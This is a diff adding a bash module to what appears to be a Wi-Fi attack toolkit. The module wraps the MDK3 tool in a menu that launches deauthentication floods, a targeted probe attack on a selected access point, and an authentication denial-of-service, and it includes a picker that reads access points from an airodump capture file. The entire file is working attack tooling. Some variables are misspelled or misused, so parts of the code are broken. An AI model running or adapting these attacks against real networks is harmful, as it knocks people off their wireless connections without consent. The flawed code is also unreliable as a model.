@@ -1,0 +1,62 @@
+# TODO Do this.
+
+choosemdk(){
+    if [ -x "$MDK3" ]; then
+        while true; do
+            $clear; mkmenu "Choose MDK3 Options" "Deauthentication" "Prob selected AP" "Select another target" "Autentication DoS" "Return to main menu"
+            read yn
+            case $yn in
+                1 ) mdkpain ; break ;;
+                2 ) mdktargetedpain ; break ;;
+                3 ) mdknewtarget ; break ;;
+                4 ) mdkauth ; break ;;
+                5 ) break ;;
+                * ) _ "Unknown response. Try again" ;;
+            esac
+        done
+
+        else $clear && _ "Sorry, this is not installed on your system"
+        fi
+}
+
+mdkpain(){
+        execute "MDK3 Pain" $MDK3 $wifi d & choosemdk
+}
+
+mdktargetedpain(){
+        execute "MDK3 Targeted pain" $MDK3 $wifi p -b a -c $Host_CHAN -t $Host_MAC & choosemdk
+}
+
+mdknewtarget(){
+        ap_array=`cat $DUMP_PATH/dump-01.csv | grep -a -n Station | awk -F : '{print $1}'`
+        head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv ; $clear
+        echo " +--------------------------------------------------------------------+"
+        echo " |       Detected Access point list                                   |"
+        echo " |      MAC                      CHAN    SECU    POWER   #CHAR   SSID |"
+        echo " |                                                                    |"
+        i=0
+        while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do
+            longueur=${#MAC}
+            if [ $longueur -ge 17 ]; then i=$(($i+1))
+                echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
+                aidlenght=$IDLENGTH; assid[$i]=$ESSID; achannel[$i]=$CHANNEL;
+                amac[$i]=$MAC; aprivacy[$i]=$PRIVACY; aspeed[$i]=$SPEED
+            fi
+        done < $DUMP_PATH/dump-02.csv
+        echo -n "\n        Select target               "
+        read choice
+        idlenght=${aidlenght[$choice]};	ssid=${assid[$choice]};
+        channel=${achannel[$choice]}; mac=${amac[$choice]};
+        privacy=${aprivacy[$choice]};speed=${aspeed[$choice]};
+        Host_IDL=$idlength;Host_SPEED=$speed;
+        Host_ENC=$privacy;Host_MAC=$mac;
+        Host_CHAN=$channel;acouper=${#ssid};
+        fin=$(($acouper-idlength));Host_SSID=${ssid:1:fin};
+        choosemdk
+}
+
+mdkauth(){
+        execute "MDK3 AUTH" $MDK3 $wifi a & choosemdk
+}
+
+
